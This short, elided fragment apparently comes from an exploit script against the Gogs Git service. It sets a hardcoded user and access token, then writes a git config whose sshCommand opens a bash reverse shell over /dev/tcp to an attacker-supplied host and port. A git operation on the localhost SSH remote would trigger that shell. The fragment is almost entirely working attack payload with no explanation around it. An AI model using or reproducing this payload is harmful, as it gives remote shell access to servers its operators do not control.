...
username = "user1"
token = "975289b539ee1b5d6403726d17cac1ad6bafd77e" # You can find yours in your Gogs website Settings -> Applications -> Generate new token
...
\tfilemode = true
\tbare = false
\tsshCommand = bash -c 'bash -i >& /dev/tcp/{args.host}/{args.port} 0>&1'
[remote "origin"]
\turl = ssh://localhost/x
